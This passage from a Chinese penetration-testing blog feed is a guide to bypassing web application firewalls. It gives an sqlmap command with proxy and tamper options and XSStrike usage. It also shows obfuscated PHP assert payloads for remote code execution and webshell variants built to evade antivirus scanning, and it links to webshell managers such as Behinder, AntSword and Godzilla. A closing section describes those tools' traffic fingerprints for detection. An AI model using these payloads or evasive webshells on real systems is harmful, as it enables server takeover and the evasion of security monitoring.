plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;***&quot; --proxy=&quot;http:tps123.kdlapi.com:15818&quot; --tamper=&quot;waf-dog.py&quot; --random-agent</span><br></pre></td></tr></table></figure><p>总结一下绕过：</p><ol><li>代理：绕过传cc</li><li>tamper：注入规则</li><li>user-agent：修改ua，防止匹配到工具的指纹</li></ol><h2 id="xssxsstrike绕过"><a class="markdownIt-Anchor" href="#xssxsstrike绕过"></a> XSS（XSStrike绕过）</h2><p>利用 XSStrike 绕过 加上–timeout 或–proxy 绕过 cc。跑就完事儿了！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xsstrike.py -u &quot;目标网址&quot; --timeout x  延时</span><br><span class="line">xsstrike.py -u &quot;目标网址&quot; --proxy  代理地址</span><br></pre></td></tr></table></figure><h2 id="rce"><a class="markdownIt-Anchor" href="#rce"></a> RCE</h2><h3 id="可逆算法绕过"><a class="markdownIt-Anchor" href="#可逆算法绕过"></a> 可逆算法绕过</h3><ul><li><p>base64：很可能base64_decode会被拦截（如果你传入的代码自带base64解码，那当然万事胜意啦，如果没有，那么就只能你传入一个解码函数了）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">txt=base64_decode(cGhwaW5mbygp)</span><br></pre></td></tr></table></figure></li><li><p>url 编码</p></li><li><p>进制编码（十六进制）等：很可能会拦截hex等函数，理由跟base64差不多。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">txt=$hex=&#x27;706870696E666F2829&#x27;;assert(pack(&quot;H*&quot;,$hex));submit=%E6%8F%90%E4%BA%A4</span><br></pre></td></tr></table></figure></li></ul><h3 id="替换绕过"><a class="markdownIt-Anchor" href="#替换绕过"></a> 替换绕过</h3><p>也就是将一个字符设置为空，那么这个字符可以加载到任何位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">txt=$y=str_replace(&#x27;x&#x27;,&#x27;&#x27;,&#x27;pxhpxinxfo()&#x27;);assert($y);&amp;submit=%E6%8F%90%E4%BA%A4</span><br></pre></td></tr></table></figure><h3 id="拼接"><a class="markdownIt-Anchor" href="#拼接"></a> 拼接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">txt=$X=&#x27;asse&#x27;;$xx=&#x27;rt&#x27;;$xxx=$x.$xx;$y=str_replace(&#x27;x&#x27;,&#x27;&#x27;,&#x27;pxhpxinxfo()&#x27;);assert($y);&amp;submit=%E6%8F%90%E4%BA%A4ce</span><br></pre></td></tr></table></figure><h3 id="更改传参方式"><a class="markdownIt-Anchor" href="#更改传参方式"></a> 更改传参方式</h3><p>实际上就是post的data部分传入GET请求，然后再在get请求URL上填入参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[URL GET]</span><br><span class="line">http:/127.0.0.1/pikachu/vul/rce/rce_eval.php?x=rt</span><br><span class="line">[POST DATA]</span><br><span class="line">txt=$x=&#x27;asse&#x27;;$xx=$GET[&#x27;x&#x27;];$xxx=$x.$xx;$y=str_replace(&#x27;x&#x27;,&#x27;&#x27;,&#x27;pxhpxinxfo()&#x27;);$xxx($y);&amp;submit=%E6%8F%90%E4%BA%A4</span><br></pre></td></tr></table></figure><h2 id="文件包含"><a class="markdownIt-Anchor" href="#文件包含"></a> 文件包含</h2><p>：没什么好说的就这几种 …\ …/ …\等</p><h1 id="权限控制"><a class="markdownIt-Anchor" href="#权限控制"></a> 权限控制</h1><p>一个文件上传到网站之后，杀毒软件会对这个文件进行扫描和监控后续敏感操作。</p><ol><li>代码级别的绕过，需要识别各种后门的代码是否是恶意代码</li><li>操作级别的绕过，对后门的操作合理化</li></ol><h2 id="免杀思路"><a class="markdownIt-Anchor" href="#免杀思路"></a> 免杀思路</h2><h3 id="变量覆盖"><a class="markdownIt-Anchor" href="#变量覆盖"></a> 变量覆盖</h3><p>例如：<code>&lt;?php assert($_POST['chopper'])?&gt;</code></p><p>变成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = $_GET[&#x27;x&#x27;];</span><br><span class="line">$$a = $_GET[&#x27;y&#x27;];</span><br><span class="line">$b($_POST[&#x27;z&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>传递的参数为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /URL/?x=b&amp;y=assert</span><br><span class="line">...</span><br><span class="line">[data]</span><br><span class="line">z=phpinfo()</span><br></pre></td></tr></table></figure><p>注：</p><ul><li>简单拆分不行，因为waf会进行变量跟踪</li><li>出现关键词不行，会直接拦截</li><li>如果传入的<code>phpinfo()</code>等操作被拦截，则需要配合编码</li></ul><h3 id="编码-2"><a class="markdownIt-Anchor" href="#编码-2"></a> 编码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = $_GET[&#x27;x&#x27;];</span><br><span class="line">$$a = $_GET[&#x27;y&#x27;];</span><br><span class="line">$b(base64_decode($_POST[&#x27;z&#x27;]));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>传递的参数为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /URL/?x=b&amp;y=assert</span><br><span class="line">...</span><br><span class="line">[data]</span><br><span class="line">z=cGhwaW5mbygp</span><br></pre></td></tr></table></figure><h3 id="异或操作加密混淆"><a class="markdownIt-Anchor" href="#异或操作加密混淆"></a> 异或操作&amp;&amp;加密混淆</h3><p>可以使用工具：</p><ul><li><a href="https://www.phpjiami.com/phpjiami.html">网络接口加密（更稳）</a></li><li><a href="https://github.com/djunny/enphp">enphp工具</a></li></ul><h3 id="造轮子"><a class="markdownIt-Anchor" href="#造轮子"></a> 造轮子</h3><p>waf基本都有菜刀、蚁剑、冰蝎的指纹，当你使用他们的时候，一些危害行为会被拦截！</p><p>要想不被识别拦截，只能自己造轮子！</p><p>自己写数据包，不会有那些指纹特征，就能实现功能！</p><h2 id="工具"><a class="markdownIt-Anchor" href="#工具"></a> 工具</h2><h3 id="冰蝎"><a class="markdownIt-Anchor" href="#冰蝎"></a> <a href="https://github.com/rebeyond/Behinder/releases/">冰蝎</a>、<a href="https://github.com/AntSwordProject/antSword/releases">蚁剑</a>、<a href="https://pan.baidu.com/s/1msqO2kps139NNP9ZEIAVHw?code=xiao">菜刀</a>、哥斯拉</h3><h4 id="原理以及优缺点"><a class="markdownIt-Anchor" href="#原理以及优缺点"></a> 原理以及优缺点</h4><p><strong>原理</strong>：把一些具体执行语句集成化（各种各样在功能语句都帮你写好了），你直接连接执行就可！</p><p><strong>优缺点</strong>：菜刀：未更新状态，无插件，单向加密传输。蚁剑：更新状态，有插件，拓展性强，单向加密传输。冰蝎：更新状态，未知插件，偏向于后渗透（MSF），双向加密传输</p><p>单向加密传输是什么？我加密数据给服务器，而服务器返回的就没有加密。</p><h4 id="流量分析"><a class="markdownIt-Anchor" href="#流量分析"></a> 流量分析</h4><p><strong>菜刀</strong>：【z0，明文/base64】</p><ul><li>eval函数执行</li><li>攻击的payload使用base64编码</li><li>默认参数<code>z0 </code>对应<code>$_POST [z0]</code>接收到的数据，该参数值是使用 Base64 编码的，所以可以利用 base64 解码可以看到攻击明文</li></ul><img src="/images/WAF%E7%BB%95%E8%BF%87-%E4%B8%80%E8%88%AC%E6%80%A7%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/image-20230613211014792.png" alt="image-20230613211014792" style="zoom:67%;" /><p><strong>蚁剑</strong>：【ini_set，部分明文】</p><ul><li>正文解码发现：<code>@ini_set (&quot;display_errors&quot;,&quot;0&quot;);</code>，也使用base64加密payload</li><li>参数名大多以 <code>_0x.....=</code>”这种形式（下划线可替换为其他）</li><li>后面为加密数据的数据包也可识别为蚁剑的流量特征</li></ul><p><strong>冰蝎</strong>：【UA头，content-type，数据长度（协商密钥数据等长），返回的全是加密字符】</p><ul><li>冰蝎数据包总是伴随着大量的content-type：application什么什么，无论GET还是POST，请求的http中，content-type为application/octet-stream。还有他们的accept之类的长度总是等长，正常的根据应用场景和不同文件，长度是不同的</li><li>内置很多UA头，相同IP重复请求，但是UA头不一样，则需要注意</li></ul><p><strong>哥斯拉</strong>（base64 加密）：【响应三次】</p><ul><li>发送一段固定代码（payload），http 响应为空</li><li>发送一段固定代码（test），执行结果为固定内容</li><li>发送一段固定代码（getBacisInfo）</li></ul><h3 id="混淆免杀工具"><a class="markdownIt-Anchor" href="#混淆免杀工具"></a> 混淆免杀工具</h3><p>上面有提到一些。</p><p>注：蚁剑和菜刀的流量后门基本上是一致的，所以都可以用他的混淆，例如D盾的混淆：<strong>as-webshell-venom</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/WAF%E7%BB%95%E8%BF%87-%E4%B8%80%E8%88%AC%E6%80%A7%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/WAF%E7%BB%95%E8%BF%87-16867110382</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="waf绕过" scheme="https://j3f5.github.io/tags/waf%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
</feed>
